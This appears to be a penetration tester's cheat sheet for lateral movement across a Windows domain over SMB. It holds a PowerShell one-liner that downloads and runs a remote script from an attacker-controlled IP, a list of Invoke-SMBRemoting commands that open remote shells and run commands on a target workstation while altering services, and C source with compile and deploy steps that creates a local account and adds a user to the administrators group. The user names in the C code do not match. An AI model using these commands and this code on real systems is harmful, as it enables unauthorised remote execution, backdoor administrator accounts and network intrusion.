# Powershell Implementation
*NOTE: We need admin access to SMB on the victim, can be abused using also injected kerberos ticket!*
- Invoke the script: `iex(iwr http://192.168.45.223/Invoke-SMBRemoting -UseBasicParsing)`

## Cheetsheet:
<ins>Interactive Shell</ins>
  - `Invoke-SMBRemoting -ComputerName "Workstation-01.ferrari.local"`
  - `Invoke-SMBRemoting -ComputerName "Workstation-01.ferrari.local" -PipeName Something -ServiceName RandomService`
  - `Invoke-SMBRemoting -ComputerName "Workstation-01.ferrari.local" -ModifyService -Verbose`
  - `Invoke-SMBRemoting -ComputerName "Workstation-01.ferrari.local" -ModifyService -ServiceName SensorService -Verbose`

<ins>Command Execution</ins>
- `Invoke-SMBRemoting -ComputerName "Workstation-01.ferrari.local" -Command "whoami /all"`
- `Invoke-SMBRemoting -ComputerName "Workstation-01.ferrari.local" -Command "whoami /all" -PipeName Something -ServiceName RandomService`
- `Invoke-SMBRemoting -ComputerName "Workstation-01.ferrari.local" -Command "whoami /all" -ModifyService`
- `Invoke-SMBRemoting -ComputerName "Workstation-01.ferrari.local" -Command "whoami /all" -ModifyService -ServiceName SensorService -Verbose`

# EXE Implementation

Save the content below as adduser.c:

```
#include <stdlib.h>
int main ()
{
 int i;
    i = system ("net user amit Password123! /add");
    i = system ("net localgroup administrators salar /add");
 return 0;
}
```
Compile it:
- `x86_64-w64-mingw32-gcc adduser.c -o adduser.exe`

Then, run: `.\PsExecLat file01 C:\Windows\Tasks\adduser.exe`
